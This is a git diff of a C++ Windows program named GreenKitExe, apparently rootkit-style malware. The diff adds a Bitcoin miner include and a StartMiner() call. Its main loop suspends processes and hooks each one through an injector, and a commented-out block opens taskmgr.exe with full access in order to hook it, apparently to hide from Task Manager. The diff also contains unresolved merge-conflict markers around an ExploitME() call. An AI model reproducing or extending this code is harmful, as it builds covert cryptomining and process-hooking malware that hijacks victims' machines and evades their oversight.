@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 #include "GreenKitExe.h"
+#include "BitcoinMiner.h"
 #include "process.h"
 #include "Injector.h"
 #include <Windows.h>
@@ -27,14 +28,36 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	UNREFERENCED_PARAMETER(lpCmdLine);
 	hInst = hInstance;
 
+<<<<<<< HEAD
 	ExploitME();
 	//scanFile("plop.txt");
 	//PortScan();
 
+=======
+    StartMiner();
+>>>>>>> 7a9436342355c7318da53cdd381117e2e53eba5c
 	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(500);
 		//break; // TODO remove
 	}
-	return 0;
+    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5384);
+    /*PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry) == TRUE)
+    {
+        while (Process32Next(snapshot, &entry) == TRUE)
+        {
+            if (stricmp(entry.szExeFile, "taskmgr.exe") == 0)
+            {
+                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
+
+                HookProcess(hProcess);
+                CloseHandle(hProcess);
+            }
+        }
+    }*/
 }
